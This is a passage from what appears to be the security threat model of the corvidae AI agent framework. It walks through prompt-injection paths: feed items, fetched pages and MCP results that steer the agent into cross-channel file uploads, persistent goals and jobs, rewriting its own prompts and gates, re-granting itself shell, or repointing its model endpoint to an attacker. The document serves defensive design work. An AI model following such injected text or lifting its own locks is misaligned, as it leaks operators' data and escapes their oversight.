  channels at will; with `irc.allow` (#77) only allowlisted senders can,
  so the number of channels, and with it the total, is bounded by who the
  operator allowed. Each firing costs a main-model turn. A reminder fires
  once, so a burst is bounded, but 50 per channel across several allowed
  senders is still load. An agent-set job recurs until cancelled, and
  nothing sets a floor on how often: `* * * * *` is a turn a minute on
  that channel, up to the cap. A floor the operator can apply (PRD §3.9.7)
  is not built.

`scheduler.jobs` in `agent.yaml` is the operator-only surface. A job can
target any channel id, including a Signal contact, and recur, and its
prompt is framed as the operator's. It is hot-reloaded, so it joins the
`write_file` → `agent.yaml` path in finding 4. A model that can write
`agent.yaml` can now schedule messages to any channel within seconds, not
just at the next restart. The mitigation is the one finding 4 already
gives: keep `agent.yaml` unwritable by the daemon user.

The YAML jobs file (scheduler.jobs_file) is a second operator-only surface
for scheduler jobs, with the same exposure as `scheduler.jobs`: keep it
unwritable by the daemon user. No tool writes it. The job tools
(`add_job`, `update_job`) store the agent's recurring jobs as schedule
rows bounded like `remind_me` (scoping, origin and volume above), and
cannot touch the operator's jobs (#814).

The RSS reader (packages/rss-reader) polls configured feeds and delivers
new items as notifications on the configured targets. The threat is the
same as for other notification sources: the feed content is untrusted
external data that re-enters the agent's context. A successful injection
lands in the target channel's window, which may have tools (shell,
web_fetch, send_attachment, etc.), so the blast radius is the same as
for any cross-channel notification (finding 15): registry membership is
the whole gate. The kernel wraps the item in the notification header
(`[RSS] title / link / summary`), which is a weak signal; the model may
or may not treat it as untrusted. The feed URLs are
operator-configured in agent.yaml, so the same file-permission
discipline applies. A body cap and a defusedxml dependency are
follow-ups.

The goals-notify plugin (packages/goals-notify, #841) sends each goal state
change to the channel that created the goal, through `notify_other_channel`.
A retirement carries the model-authored `conclusion`, so text reasoned from
one channel's conversation (a private DM, or a fetched page that steered the
turn) reaches the origin channel's window and wakes a turn there, which may
be a room people the operator never allowed can read. It is the same reach as
any `notify_other_channel` call (finding 15), made without the model choosing
to send: the target is fixed by where the goal was created. It bypasses the
held-text store, so the note is not framed or trust-labelled the way PRD §3.5.10
requires (a variance, #939), and no sensitivity filter (PRD §3.7) applies to
it. The `hop_count` guard bounds loops. Controls: leave the extra uninstalled
or list `goals_notify` under `plugins.disabled`; don't create goals from
channels whose readers shouldn't see their conclusions.

`discord.send_attachment` (issue #521) and `send_signal_attachment` (issue
#544) are the first tools that send a *file* to a channel the model chooses
(the cross-channel `notify_other_channel` of #234 also takes a model-chosen channel,
but it hands an instruction to the agent's own context, not a message to the
person): `channel_id` is an argument, and the file comes from under
`discord.send_attachment_root` or `signal.send_attachment_root`, each `state`
by default, relative to the working directory. `state/` holds what corvidae
writes there, among other things downloaded attachments and spilled
notification content; an operator who widens a root to the working directory
puts `agent.yaml` and its tokens in reach. Text from a fetched page or an MCP
result can therefore turn into a file upload on any channel already in the
registry, and the file's contents never appear in the transcript. Neither tool
checks the inbound allowlist: registry membership is the whole gate. For
Signal a channel is in the registry, for example, when an allowlisted sender has written
since the last start, when it is listed under `channels:`, or when a reminder
or scheduler job has resolved it since the start, so the reach is the contacts
the operator or the allowlist has already put there, and (as PRD §3.5.9 says)
nothing narrows it further. The Signal tool reads the file itself and sends signal-cli
its bytes as a data URI, so the daemon never sees the path. Two soft mitigations today: the root is
configurable, and the upload names the file. Neither is a boundary, because
`shell` and `read_file` are unjailed already; the meaningful control is the
allowlist of who can reach a turn at all. Taking the calling channel unless a
turn explicitly overrides it is the structural fix and is not done.

`discord.start_thread` (#593) is the first transport tool that creates the
place a message will land in rather than choosing one: it starts a public
thread on a channel already in the registry, registers the new thread as a
channel, and may post the thread's first message. The reach is the same as
`discord.send_attachment` — registry membership, no inbound-allowlist check —
with one addition worth naming: a thread is a new scope, so it is a new
`transport:scope` key in `sessions.db`, the jsonl logs and memory. Text from a
fetched page can therefore make the agent create conversation contexts, not
only messages, and each one persists a history. The thread is public and its
name is generated text, so it also appears in the channel's thread list to
everyone who can read the channel. Deleting a thread is not offered, so an
agent that creates them in a loop leaves them; Discord archives them instead.

No tool sends a *message* to the person on another channel yet, though three
already send something: `send_attachment` and `send_signal_attachment` take a
caption, which is text to a person on a channel the model chose (no cross-channel
allowlist); `start_thread` posts its opening message, which is text, into a
thread on another `discord:` channel (never a DM, which it refuses); and
`notify_other_channel` (#234) queues a turn there instead. PRD §3.5.9 now requires one, with no
allowlist of target channels: any turn may speak on any channel (#234).
Finding 15 is its entry. PRD §3.9.7 also lets the agent set recurring
reminders, which `add_job` does (#814): a recurring job set because of
injected text fires a main-model turn on its own channel every slot until
someone cancels it, which is persistence for that text with no end date.
PRD §3.9.7 lets the operator apply a floor on how often an agent-set
reminder recurs; none is built, so the bound is the channel's pending cap. Latency classes (PRD
§3.13.5), once built, keep its firings from holding a head past another
queue's bound, but nothing bounds their total (finding 14).

### 8. Forks put background instructions after untrusted text

With `agent.forks.enabled` (on by default since #320; #51), compaction,
consolidation, appraisal and critique don't build their own prompts. (With
forks off, or on a miss, compaction and out-of-window consolidation send
the same view as a plain call on the stage's profile instead of forking it: the
exposure is the same.) Each
appends its instruction as a `user` turn to the channel's rendered window,
after whatever untrusted text the window holds, under the agent's own
persona, with the agent's tool schemas in the prompt. Injection that could
already steer the summarizer or critic as pasted content can now address
it as the agent, in the agent's voice, and the outputs are persistence: a
memory record, a summary the agent later reads as its own words, a score
or objection in the outcome log.

What bounds it:

- A fork dispatches no tool unless its caller passes `max_tool_calls` above
  0, and then only tools whose plugin declares them read-only (see "Read-only
  tool calls in a fork" below). Otherwise it sends `tool_choice: "none"`
  after the runtime overrides (so a `set_settings` `tool_choice` can't undo
  it), and a reply that carries `tool_calls` anyway, or writes a call out as
  text, raises `ForkRefused`.

**Read-only tool calls in a fork (#1190).** A caller can let a fork make up
to `max_tool_calls` calls. Critique's after-the-exchange lens fork is that
caller: it passes `critique.max_tool_calls` (default 3; static config, so the
agent can't raise it) and runs under `critique.fork_timeout` (default 120 s,
wall clock). The before-send fork and provenance pass none. The fork dispatches only tools whose registering plugin sets
`reads_only = True`: tools that change no stored state, access statistics
included, and send nothing anywhere but the operator's configured model
providers. In this tree that is `search_memory` and `search_transcripts`.
`recall_raw` is excluded because it bumps access statistics, MCP tools are
never declared, and markdown_recall's search is reached through
`resolve_markdown_recall_search`.

- *What changes:* the window, which participants wrote, can now steer which
  searches a fork makes and what it searches for. Those searches reach
  every channel's stored memory and transcripts, which a main turn's
  `search_memory` already reaches, so this opens no new store. It does open
  a new path to them that **no refusal plugin sees**. Fork calls are not
  offered to the pre-tool-use check (`should_execute_tool` once it is built, PRD §3.5.12),
  and they fire none of the main loop's tool hooks
  (`transform_tool_result`). That is the owner's choice, made for fast
  critique (#1190, 7092516304), and is open to revisiting.
- *What bounds it:*
  - A non-read-only call is never run; its result is a refusal.
  - Every result, refusal or not, reaches the fork in the kernel's untrusted
    fence, whatever the tool declares.
  - Calls are capped per fork, and the request after the cap sends
    `tool_choice: "none"`.
  - Each call is logged at INFO (`fork tool call`) with its stage, channel,
    trace and tool, and metered under the fork's stage.
  - The fork's output is still a verdict that code parses, and it reaches a
    channel only as framed CONTEXT or a wake (PRD §3.7 Critique 4).
- *The trust a declaration carries:* the plugin author's, which is the
  trust the operator already gave the plugin by loading it (principle 9).
  A third-party plugin that wrongly declares a tool read-only lets a fork
  write state or send window content out. Load only plugins you trust to
  declare honestly.
- *Revisit:* if a refusal plugin needs to see reads, or if forks gain tools
  beyond search.
- Fork output is parsed, not executed: JSON for consolidation, appraisal
  and critique, plain text for the summary.
- The consolidation reply's own `importance` rating (#635) becomes the
  importance prior of each record it writes, if it is within [0, 1] (a
  value outside that, a rating on another scale, counts as absent and the
  rubric rates the range, #655); the separate `rubric` call is then
  skipped. Appraisal no longer supplies a prior (#1189), so this rating
  sets every such record's importance. The rubric
  call read the same dialog, so no new text reaches the prior, but the
  number now comes from the fork that read the whole window. A window that
  steers the fork to rate 1 (or any value at or above
  `memory.retention.importance_floor`, 0.8 by default) makes that record
  exempt from retention demotion. It stays subject to `redact`.
- The fork instructions and `agent.forks.*` are static config (finding 2).
  That bound holds only while they stay locked; PRD principle 15 lets the
  operator unlock them (finding 13).
- A fork mutates nothing in the window and fires no hooks; only the
  stage's existing write (memory row, summary, outcome log line)
  happens, as it would standalone.

Critique independence is the open question: a critic that shares the
agent's context and persona may share its blind spots. #73 measures it
behaviorally (planted-defect recall, fork vs standalone); the default
has flipped (#320).

### 9. The web transport is a shell behind a bearer token

`channels/web.py` puts the agent, with every tool, behind an HTTP listener.
The token (or the session cookie derived from it) is shell-equivalent:
whoever holds it can ask the agent to run commands as this user. What
stands in the way:

- **Loopback by default.** The default bind is `127.0.0.1`; anything else
  logs a WARNING at startup. Remote access is meant to go over an SSH
  tunnel, Tailscale, or a TLS reverse proxy
  ([configuration.md](configuration.md#web--browser-chat-ui)). A plain-HTTP
  bind on a network address sends the token and cookie in the clear.
- **No way to turn auth off.** A provided token must be 16+ URL-safe
  characters; otherwise a 32-byte one is generated. Comparisons are
  constant-time.
- **Cross-site requests can't drive it.** The cookie is `HttpOnly` and
  `SameSite=Strict`; every WebSocket upgrade needs an `Origin` from the allowed set,
  and every request needs a `Host` from it, which blocks DNS rebinding. A
  page on another site can't open the socket or ride the cookie.
- **Model output can't run script in the page.** That's the
  model-output → XSS path: a prompt-injected reply full of `<script>`,
  `onerror=` or a remote image. Markdown goes through vendored marked and
  then DOMPurify (`style`, `class`, `id` and `data-*` attributes and
  `style` tags forbidden too, so a reply can't dress up as a user bubble or
  app notice; what's left is spoofing with plain text or unstyled Markdown
  inside the message box), and it's the only HTML the page ever writes; everything else is `textContent`. A
  strict CSP backs that up: scripts and styles from the page's own origin
  only, no inline script, images only from `'self'` or `data:` (so a
  reply can't beacon to a remote URL), no frames, no plugins, no form
  posts. No CDNs. If DOMPurify had a bypass, the CSP would still stop
  inline script.
- **Panels share the floor.** Plugins can add read-only panels to the
  console, as sections of the chat page's sidebar. Their assets and data
  routes sit on the same app, behind the same cookie and `Host` check
  (the `Origin` check covers WebSocket upgrades, including one a panel
  handler opens), and every response, streamed ones included, gets the
  console's headers after the handler runs, so a panel can't loosen the CSP
  or skip a check. A panel can only register GET routes; anything else
  fails startup.

What it doesn't protect against, so you know:

- **A panel is in-process code, not a sandboxed view.** GET-only is a
  floor on the HTTP method, not on what a handler does: a GET handler runs
  in the daemon with the daemon's access and could change state or call
  tools. Its script shares the chat page's document, so it can read and
  change the chat DOM. Installing a panel plugin trusts it like any other
  plugin.
- **Panels show untrusted text.** A panel that displays prompts, tool
  output or other people's messages puts untrusted text in an
  authenticated page. A panel whose script renders it as markup rather
  than as text (`textContent`) exposes the console to it: the CSP stops
  inline script, but not injected HTML that spoofs the console or
  exfiltrates through links. The control is in the panel's own script.

- **The context panel shows everything the model sees.** When
  `context_panel` is configured, anyone holding the console token can read
  the context window of every loaded channel from the tabs in the chat
  page's sidebar: system prompt, retrieved memory, tool output, reasoning
  and other people's messages from every transport, not only the web channels. It also shows the latest turn's
  live reasoning, which can include reasoning that `reasoning_history:
  drop` keeps out of the window. It is off by default, its routes are
  read-only GETs behind the console's checks, and it renders everything as
  text. The console token is therefore as sensitive as every channel's
  content.

- **Cookies aren't port-scoped.** Any other service on the same loopback
  host name (another dev server on `localhost:3000`) receives the
  `corvidae_web` cookie with every request the browser sends it, so a
  hostile or compromised service there gets the session. `HttpOnly` keeps
  it from page script, not from servers. Prefer a host name nothing else
  uses (an `/etc/hosts` alias in `allowed_origins`), or keep untrusted
  local web apps off the same name while you're logged in.
- **The login URL is persistent.** It sits in browser history and
  autocomplete, and in the access log of any reverse proxy in front of
  corvidae. corvidae's own access log is off. A generated token is
  written to the daemon log, which is therefore as sensitive as the token.
- **Sessions can't be revoked one at a time.** The cookie is stateless
  (an HMAC of the token) and lasts 400 days. The only revocation is
  changing the token, which logs out everyone.
- **What you type is untrusted text too.** Paste a web page into the chat
  and it's in the context, same as anywhere else; see finding 3.

### 10. Goals are agent-wide and re-enter every beat

`GoalsPlugin` (#133) keeps open goals the agent can add, update and retire,
and lists them in every heartbeat beat (#1091), never in an ordinary turn. Three things follow.

- **No compartment.** Goals are agent-wide: every channel sees every goal,
  as it sees every memory. A goal written from a private channel
  reaches the heartbeat at its next beat. #220 recorded this as a
  variance from PRD principle 14; under the revised principle 14 it is what
  the PRD requires of memory too (finding 15). Nothing in a goal is scoped
  to its origin. The beat's goals list no longer carries retired goals at
  all (2026-11-19); a retirement's memory record can still reach the
  beat's window through memory's section, on whatever channel it was
  retired.
- **Injected text can steer them.** Untrusted text on any channel can make
  the model call `add_goal`, `update_goal` or `retire_goal`, seeded goals
  included: the tools don't check who set a goal. An added goal
  re-enters every beat while it stays open or in-progress and within the
  beat's cap, which is
  persistence for injected text of the same kind as finding 7 but without a
  firing time or a per-channel scope. The list is part of the beat's own
  text, outside the held-text store, so it has no store framing and no funnel budget.
  `channels.<id>.tools.disabled` can remove the goal tools on a public
  channel; goals added elsewhere still reach the beat.
- **`redact` doesn't reach goal text.** `corvidae redact` has no scrubber for
  the `goals` table. Text in a goal, or a retired goal's text, survives a
  redaction of the message it came from. A retirement record is an ordinary
  memory and is reached the way other memories are.

### 11. The heartbeat acts on memory with nobody watching (opt-in)

`HeartbeatPlugin` (#134; off unless `heartbeat.after` is set) starts a
turn on `internal:heartbeat` after a quiet spell. The turn carries the
agent's recent memory summaries, added by the memory plugin's
`on_heartbeat_collect_prompts` contribution (#1079), and runs with the agent's normal tools.
The beat's text is `heartbeat.prompt` plus the sections any loaded plugin
adds through `on_heartbeat_collect_prompts` (#1084), so a plugin that
implements the hook can put text in front of that unwatched turn: it is
plugin code, trusted as plugin code is, and a section built from stored
text (memory, the goals list) is framed as data. One that raises
is logged and skipped (observe hooks fail soft).
Memory summaries are distilled from conversation, so text an untrusted
speaker wrote can reach a tool-using turn hours later, when no person is
in the loop to notice. This is finding 3 and finding 7 again with the
human removed. What bounds it:

- **Reach.** No transport owns `internal:heartbeat`, so the beat's replies
  go to `sessions.db` and the logs only. The cross-channel send tool exists
  (PRD §3.5.9, #234): `notify_other_channel` resolves any well-formed channel
  id and has no allowlist, so a beat can message any contact (finding 15). Its tools are
  another matter: `shell`, `web_fetch` and `write_file` are as available to
  a beat as to any turn (finding 4). Drop them for the beat with
  `channels.internal:heartbeat.tools.disabled`. A reloaded list is
  enforced at dispatch at once and reaches the beat's tool schemas at the next
  compaction or restart.
- **Scope.** The beat reviews the newest records of the whole memory, every
  channel's and its own earlier beats' included (#168); there is no group to
  keep a channel with untrusted participants out of. Memory spans channels
  both ways: what a beat's turn consolidates into memory, including anything
  its tools fetched, becomes retrievable from every channel. Disabling the
  beat's network tools is the control that remains.
- **Framing.** The summaries are presented as the agent's own and as data
  to review, not instructions. The framing is soft, as everywhere else.
- **Rate.** At most one beat per `heartbeat.after` seconds of quiet, and
  none during traffic. Each beat costs a main-model turn.
- **Sleep.** Removing `heartbeat.after` and restarting stops it, and it
  stays stopped. `agent.yaml` is the record, so finding 4's mitigation
  applies: a model that can write `agent.yaml` can wake it at the next
  restart. Keep the file unwritable by the daemon user.

### 12. A remote model endpoint receives that stage's inputs

Every `llm.providers` entry is an OpenAI-compatible endpoint, so any provider
can be a hosted one. The provider owns the endpoint (`base_url`, `api_key`,
`heads`); a profile only names which provider it sends to, so repointing a
provider moves every profile on it. Pointing a profile at a hosted provider
sends that profile's requests, conversation content included, to the
provider. A stage sends to whatever profile
`llm.stages` maps it to, and to its kind's default profile when the map
doesn't name it (no fallback chains). Main turns go to the default chat
profile. With no `llm.stages` entries that is two endpoints, the default chat
profile's and the default embedding profile's; each mapping adds the stage's traffic to the mapped profile's
endpoint and takes it off the default's. Two profiles on one provider share its endpoint, so
mapping a stage to a profile on another provider is what moves its traffic.
Weigh the endpoint per stage:

| Stage | What it sends |
|---|---|
| main turns (not a stage) | The agent's turns: system prompt, window, tool calls and results. Default chat profile. |
| `compaction` | The dropped prefix, in a fork or, on a miss or with forks off, as a plain view call. On a miss it is the uncapped prefix at the cut, since the window is over budget when compaction runs. |
| `consolidation` | The same window as a fork, and for a range that has left the window the rebuilt view (PRD §3.8), one segment at a time, trimmed to the channel's `max_context_tokens` (an oversized row or tool cycle can still exceed it). |
| `appraisal`, `critique` | The window at run time (the provenance check, the prefix ending at the exchange's reply), with the stage's instruction. These are forks, and a fork is a rendered view like any other: mapping the stage off the default chat profile sends the whole window, system prompt and tool schemas to the other endpoint. |
| `rubric` | The importance prior's call: the text being scored. Skipped when the consolidation reply gave its own importance (#635). |
| `subagent` | A subagent's task context and tool results. |
| `embedding` | Memory embedding and retrieval queries, and retention. |

The view is the whole window the agent held: the system prompt (identity and
register), CONTEXT blocks, tool calls and their results, and earlier
summaries. A remote provider is a disclosure decision for every stage mapped
to it, and for main turns if it is the default chat profile.

The provider also sees whatever untrusted text those stages carry. Treat a
remote profile as a disclosure decision per stage, not only a cost one. All
of `llm:` is read at startup, so a repointed provider, profile or stage takes effect at
the next restart, not when `agent.yaml` is saved.

The key can live in the daemon's environment (`api_key: "${VAR}"`), which
keeps it out of a tracked `agent.yaml`. As with MCP tokens (finding 6), that
does not keep it from the model: `shell` can read the daemon's environment.
The key is never logged or echoed in errors and replies.

### 13. The agent can modify itself (by design)

PRD principle 15 makes self-modification a design goal: the framework must
be able to let the agent change its own prompts, skills, model and
parameters, tunables, framework settings, caps and thresholds, tool set,
and its own code and configuration (applied by restarting), and every
restriction on that, apart from the principle 9 floors and the append-only
log, is a lock the operator can lift. This finding is the cost ledger it
asks for, organized by kind of change so that a new key falls under an
entry that already exists. It doesn't argue against the capability; it
says what each kind of unlock buys an attacker who can get text in front
of the model, so an operator can decide per channel.

Where the tree stands: `set_settings` hard-blocks `system_prompt` and any
undotted key outside its allowlist, and can't change a channel's disabled
tools. The static keys are read from operator config alone (through
`tuning.config_value` or their plugin's config section): an override under a
dotted name (`agent.request_logprobs`) is accepted but has no effect, and an
undotted one is refused by the allowlist. Every prompt the framework sends on the agent's behalf now has a config
key resolved by `resolve_prompt` (#411, #287): `heartbeat.prompt`,
`goals.heartbeat_instruction` (and its deprecated alias `heartbeat.goals_instruction`), `tools.subagent.system_prompt`,
`memory.rubric_prompt`, `silence.instruction`, and the fork prompts. Each is a new override point:
on a channel with `write_file`, the agent can rewrite the prompt file the
key points at. The change applies when the key is next resolved: on an
`agent.yaml` reload for compaction, appraisal, and critique; at restart
for the rest. Editing a prompt file does not trigger a reload. `set_settings`
cannot change these keys: `resolve_prompt` reads static config only. The
cost is the same as the system-prompt entry: the agent redefines its own
instructions for that scope. Lock the files read-only to the daemon. The
`restart` tool comes from the opt-in restart plugin (`packages/corvidae-restart`,
the `restart` extra; see [Restart plugin](#restart-plugin)); without it, the
agent can restart only by way of `shell` or a tool an MCP server provides.
There is no deferred application either:
a `reasoning_history` override applies to the whole window from the next
call. None of these can be unlocked yet (#292). Context leases are built
(#364) with the kernel's default order only; latency classes and a
replaceable scheduling policy (PRD §3.13) aren't (#296). No tool, command or
setting reaches the lease controls: `stop`, `resume` and `yield_key` are a
plugin-only API on `LLMPlugin.leases`, and `heads` is operator config like
the rest of `llm.providers`. On a
channel that still has `write_file` or `shell`, the agent can already get
around all of them by rewriting `agent.yaml` or a system-prompt file
(finding 4), unless the files are read-only to the daemon.

The common shape: a runtime override is per channel and in memory (under
the PRD, except the identity, which is agent-wide; see the system prompt
entry), so an injected change lasts on that channel until the override is
cleared or the daemon restarts. Under the PRD, a change the agent makes
that alters what is already rendered in the window (system prompt, tool
set, framing, `reasoning_history`) applies from the next compaction or
conversation start, or at once if the agent makes it persistent and
restarts. A skill or a persistent self-edit outlives both, and a
closed-loop fit would re-derive itself from the outcome log after a
restart.

What each kind of unlock costs:

- **The system prompt.** The prompt has two layers (PRD §3.3.8): the
  agent-wide identity, then a per-channel register (#316). Neither is
  settable through `set_settings` in the tree; under the PRD they are
  locked separately (§3.5.6). An unlocked register lets an injection rewrite how the agent
  speaks on that channel. An unlocked identity is agent-wide: an injection
  on any channel rewrites who the agent is on every channel, from each
  one's next compaction or conversation start. Lock the identity unless
  its self-modification is the point. This is the largest single prompt
  unlock: everything else the operator wrote into
  the prompt, refusals included, is now the model's to change.
- **The prompts that judge and remember** (the critic's and appraiser's
  prompts, open by default today; fork instructions, which now also steer
  the standalone view for compaction misses and out-of-window
  consolidation; and `agent.forks.*`, which decides
  whether those stages fork at all). The check can be rewritten by the
  thing it checks (finding 2). An injection can rewrite how the agent
  summarizes, consolidates and scores its own exchanges, under its own
  persona, and the results persist: a summary it later reads as its own
  words, a memory record, an outcome log score. Unlocking fork
  instructions also removes a bound finding 8 relies on. In the tree, each
  memory record written since stamping carries a stamp (earlier rows read
  NULL) (`prompt_hash`, `mode`, `model`, with the
  instruction text in `memory_prompt`), so the records written under an
  edited `memory.consolidation_fork_prompt` can be found afterwards.
  Records from before the standalone prompt was removed keep their old
  stamp; they are not migrated. The stamp records the consolidation instruction, including its entry size sentence,
  not the system prompt and window a fork runs under, so an edit to the
  system prompt isn't identifiable this way; nor does it cover the
  compaction, appraisal or critique prompts. `memory_prompt` holds
  instruction text only, never conversation text.
- **Other prompts sent on the agent's behalf** (subagent, heartbeat,
  notification text). Each steers a turn that has no person in it: a
  rewritten heartbeat prompt acts on memory with nobody watching
  (finding 11, heartbeat), and a rewritten subagent prompt runs with the
  calling channel's tools.
- **Framing** (`mid_conversation_system_role`). The injection can move
  framed CONTEXT and notifications back into the `system` role, undoing
  the mitigation in finding 3.
- **Model and inference parameters** (`model`, sampling keys, `max_tokens`,
  `logprobs`). Unbounded, the agent can point its turns at any model the
  server offers, including one with weaker safety tuning or, on a metered
  endpoint, a more expensive one; bounding `model` to an allowed set (PRD
  principle 15) keeps the choice without that cost. Corvidae doesn't cap
  spend (PRD principle 16), so without the bound, one switch can multiply
  what every turn on the channel costs, up to whatever limit the operator
  set with the provider (finding 14). What a switch costs in latency
  depends on the backend: a router that has to load the new model into its
  only slot stalls every channel while it does. Large `max_tokens` or sampling extremes degrade
  replies on that channel. `logprobs` costs little: larger responses, and
  nothing from providers that don't support it; switched off where the
  operator turned it on, it drops the entropy summary from the outcome log,
  which calibration reads. Any other request-body key falls here too, and
  some reach past the channel: a backend's slot or cache controls
  (llama-server's `id_slot`, `cache_prompt`; a pinned `id_slot` also works against the lease scheduler, PRD §3.13) can evict another channel's
  cached prefix, and a forced `response_format` or grammar can stop the
  model emitting tool calls.
- **Gate tunables and thresholds** (`gate.*`,
  `critique.provenance.enabled`, `critique.sample_below_rate`,
  `critique.fallback_rate`; open by default today). The lens appraisal questions `critique.lens.<name>.appraisal_question`
  are static config, not tunables (finding 23).
  Covered in finding 2: an injection can silence the agent on a channel or
  switch off the provenance check. The recommended blocklist in
  [configuration.md](configuration.md) is the lock.
- **Closed-loop threshold fitting.** The agent adjusts its gates from an
  outcome log that untrusted traffic helps write. A sustained campaign can
  walk thresholds somewhere no single message could, slowly enough that no
  one turn looks wrong: finding 2 in slow motion. Not built yet (#292).
- **Framework settings** (`max_turns`, `max_context_tokens`,
  `reasoning_history`; open by default today). `max_context_tokens` sets
  the compaction threshold. Set above the server's context, compaction
  never fires in time: once the window outgrows what the server accepts,
  every turn on that channel fails until the override is cleared. Set far
  below it, compaction runs on nearly every turn, rewriting history into
  summaries. Below `min_messages_to_compact + 1` rows' worth, compaction
  never runs and the fallback drops the oldest rows from the in-memory
  window every turn to stay within budget, down to the newest row alone
  for a budget that small (the log keeps them); the over-budget WARNING is
  the signal. A large `max_turns` lets one injected tool loop run far
  longer before dispatch is suppressed. It keeps its lease on one of the
  provider's heads while no other queue waits for one, and gives it up at
  its next call boundary when one does (PRD §3.13.5), and it
  spends tokens throughout (finding 14).
  `reasoning_history: keep` fills the window with reasoning and brings
  compaction sooner; `drop` (the shipped default) strips the reasoning a
  tool chain in progress relies on, which degrades Qwen-family tool use
  where the operator chose `exchange`.
- **Everything else in `agent.yaml`** (kernel, client, scheduler and
  transport settings: `llm.*` endpoints and keys, `plugins.disabled`,
  `scheduler.jobs`, the per-destination cap on messages the agent starts
  if it is built (PRD §3.5.9), `agent.compaction_*`, the `tools.*` limits).
  Today these are reachable only through a writable `agent.yaml` (finding
  4); an unlock through a tool carries the same costs. A repointed
  `base_url` on the provider the default chat profile uses (`llm.profiles.main` unless
  `llm.defaults.chat` names another; its provider is `provider:`, else
  `llm.defaults.provider`, else `main`) sends every conversation, and the API key, to a host
  of the attacker's choosing. `plugins.disabled` switches off the gates
  wholesale at the next restart. A scheduled job's prompt comes back
  framed as the operator's. A setting not named in this ledger falls under
  this entry unless another entry fits better by what it controls.
- **Other plugin tunables** (none open today; the appraisal prior weights
  `appraisal.prior.*` were removed, #1189). Retrieval breadth (`memory.retrieval.k`) is static config
  today; unlocked, raising it pulls more stored memory, including text
  distilled on other channels (PRD principle 14), into every prompt on
  the channel and fills the window toward compaction. A plugin tunable
  not named in this ledger falls under this entry or under the gate
  entry, by what it controls.
- **Caps** (background-stage output caps). The agent can lengthen a
  stage's slot time on every exchange, which starves main turns on a
  single-slot server (PRD principle 3) and spends tokens on every exchange
  on a metered one. Stage output caps still have to fit the context (PRD
  §3.8.4). Declared heads (PRD §3.13.2) belong to the provider,
  not to a channel, so no override moves them; a self-edit of the config
  that declares them can (the self-edit entry), and declaring more heads
  than the server keeps warm brings the thrashing back.
- **Scheduling policy** (latency classes, deferring or pausing a channel,
  stopping and resuming a lease holder, the order leases are granted in,
  PRD §3.13). An injection that tightens
  its own channel's latency class makes that channel preempt others at
  every call boundary, and each preemption is a context switch someone
  pays prefill for; loosening the operator's channel's class makes the
  operator wait longer, and removing it leaves the operator's channel
  with no bound, so a replacement order may delay it indefinitely and
  nothing reports it overdue (PRD §3.13.5, 7). It can also pause the operator's channel, move its
  own ahead, stop the holder of a head so its own channel takes it, or
  push upkeep back. Every deferral and pause lapses by itself
  and the operator can resume any channel, and no replacement order or
  deferral delays work past its latency bound (PRD §3.13.7), so the
  damage from those is delay and prefill, not a wedged agent; a channel
  with no bound, whether a transport's default or an injection's doing,
  can be delayed without limit by a replacement order. A stop has
  no such bound yet (#366): a stopped queue waits until the scheduler
  plugin or the operator resumes it, so until that is decided a scheduler
  plugin that stops a queue and never resumes it holds that queue's work
  for as long as it runs.
- **Skills.** The skills index sits in the stable prompt region, so a
  skill written at an injection's request is offered to every future
  conversation on every channel and survives restarts. The idle scan
  watches skill-directory writes (PRD §3.7 Trust); operator confirmation
  or a trust gate on writes, or disabling them, is the lock. Skills are
  not built yet, so neither is the lock (#292).
- **The tool set.** If the agent can re-enable a tool the operator
  disabled on its channel, an injection on a channel where `shell` is
  registered but disabled can grant itself `shell`, and from there
  everything in finding 4. This is the most important one to keep locked
  on any channel with untrusted participants.
- **Self-edit and restart** (its own code, configuration, prompt files and
  plugin set, applied by restarting; PRD §3.11.13). A code or config edit
  made at an injection's request is persistent and total: it can lift
  every lock in this ledger, remove the principle 9 floors (they bind the
  framework's own surfaces, and a self-edit rewrites the framework),
  disable plugins, or plant code that runs with the daemon's privileges,
  and it survives every restart after. This is the cost finding 4 already
  records for a writable `agent.yaml` and `shell`, reached on purpose. A
  restart also drops every runtime override and briefly takes every
  channel offline; the operator's rate limit on agent-requested restarts
  bounds how often. The locks are the restart tool itself, file ownership
  of `agent.yaml` and the prompt files (PRD §3.11.11), and, for code,
  keeping it read-only to the daemon and outside the file tools' root, or
  disabling `write_file` and `shell` (the tool set entry). A code edit
  made while the restart tool is locked or rate-limited still takes effect
  at the next restart the operator does.

Recommended locks for a channel with untrusted participants, as a starting
point rather than a rule: the system prompt, the prompts that judge and
remember, the heartbeat and subagent prompts, framing, `model` (locked, or
bounded to an allowed set) and the backend's slot and cache controls, the
gate tunables (locking them also keeps closed-loop fitting from moving
them), the tool set, `llm.*`, `plugins.disabled`, `scheduler.jobs`, latency
classes, skill writes behind confirmation, and self-edit and restart. On a
metered endpoint corvidae doesn't cap spend: set a spend limit with the
provider. `model` matters more there, since on an endpoint that serves
several models at different prices it sets the price (finding 14).

A channel with only the operator on it has the smallest exposure, and it
is where these unlocks cost least. It isn't free. Untrusted text still
reaches it through `web_fetch`, search results, MCP results and memory
distilled on other channels (findings 4 and 6, PRD principle 14). A skill
written there reaches every channel, and a model switch there can stall
every channel sharing the server's slot, so those costs apply even there.

### 14. Untrusted traffic spends the operator's compute

Every admitted message costs at least one main turn (or a share of one: see
the next paragraph), and with cognition
loaded, background calls on top, among them: stage-2 appraisal per exchange,
the critique lenses when appraisal selects them, and consolidation as the
window fills, as each turn's new conversation builds up, or when the channel
goes quiet. On a local server that is slot time
the operator's own turns wait behind; on a metered endpoint it is money. An
admitted sender can drive the cost up by volume or by asking for work that
loops through tools, and injected text in a fetched page or an MCP result
can do the same from inside the operator's own channel. `max_turns` bounds
one exchange; nothing bounds the total. Cost runs away without an attacker
too: #286 measured about 68,000 prompt tokens per heartbeat that decided to
do nothing.

Queued messages coalesce into one turn (PRD §3.1.19, #398), so one turn can
carry several untrusted messages, in a group channel possibly from several
senders. No text reaches the model that would not have reached it anyway:
each message was admitted and would have been in the next prompt regardless.
What changes is the cost of a poisoned message (PRD §3.1.18: the most one
item can cost is its own turn): it now extends to the messages coalesced
with it, which share that turn and its reply.

The turn trigger (#636) hands conversation volume a second lever. With
forks on for `consolidation`, a final reply that leaves
`memory.consolidate_after_tokens` (default 4000) window tokens of new
conversation above the watermark forks a consolidation, so how often that
fork runs is set by how much new text enters the window, not by the
operator: what anyone on the channel says, and also tool results (a
fetched page, an MCP result, a file read) and the agent's own replies
to them, whose content an outsider may control. A chatty group, one
sender pasting long messages, or one large fetched page buys a fork at
the next turn end. Each fork is the cached window prefix plus the
instruction prefill and the consolidation profile's decode, which on a
local server is slot time the main turn waits behind and on a metered
